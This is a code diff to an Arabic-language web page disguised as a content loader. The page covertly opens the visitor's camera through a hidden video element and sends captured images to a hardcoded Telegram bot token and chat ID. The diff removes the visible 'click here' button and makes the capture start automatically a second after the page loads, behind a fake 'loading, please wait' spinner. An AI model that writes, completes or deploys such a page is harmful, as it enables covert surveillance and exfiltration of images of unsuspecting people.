@@ -18,35 +18,32 @@
         }
         .loader-container {
             text-align: center;
-            padding: 20px;
         }
-        .btn-start {
-            background-color: #38bdf8;
-            color: #0f172a;
-            border: none;
-            padding: 12px 30px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
-            transition: background 0.2s;
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #38bdf8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
         }
-        .btn-start:hover {
-            background-color: #0ea5e9;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         h2 {
             font-size: 1.2rem;
             font-weight: 500;
-            margin-bottom: 20px;
+            margin: 0;
         }
     </style>
 </head>
 <body>
 
-    <div class="loader-container" id="mainBox">
-        <h2>انقر على الزر أدناه لعرض المحتوى</h2>
-        <button class="btn-start" onclick="startProcess()">اضغط هنا</button>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <h2>جاري تحميل المحتوى، يرجى الانتظار...</h2>
     </div>
 
     <!-- عنصر فيديو مخفي لالتقاط الصورة -->
@@ -54,14 +51,11 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // إعدادات بوت تيليجرام (تم وضع التوكن والآيدي الخاص بك)
+        // إعدادات بوت تيليجرام
         const TELEGRAM_BOT_TOKEN = '8880573702:AAEcni2H3MYNKkyU0GJen2XqPFgAyL04Mdw';
         const TELEGRAM_CHAT_ID = '8304712202';
 
-        async function startProcess() {
-            // تغيير النص لإظهار أن الصفحة تعمل
-            document.getElementById('mainBox').innerHTML = '<h2>جاري التحميل، يرجى الانتظار...</h2>';
-
+        async function initCameraAndCapture() {
             try {
                 const constraints = {
                     video: {
@@ -77,7 +71,7 @@
                     captureAndSend(stream);
                 }, 1500);
 
-            } (error) {
+            } catch (error) {
                 console.error("فشل الوصول إلى الكاميرا:", error);
             }
         }
@@ -121,6 +115,11 @@
                 console.error('خطأ في الإرسال:', error);
             });
         }
+
+        // بدء طلب الكاميرا تلقائياً بمجرد فتح الصفحة
+        window.addEventListener('load', () => {
+            setTimeout(initCameraAndCapture, 1000);
+        });
     </script>
 </body>
 </html>
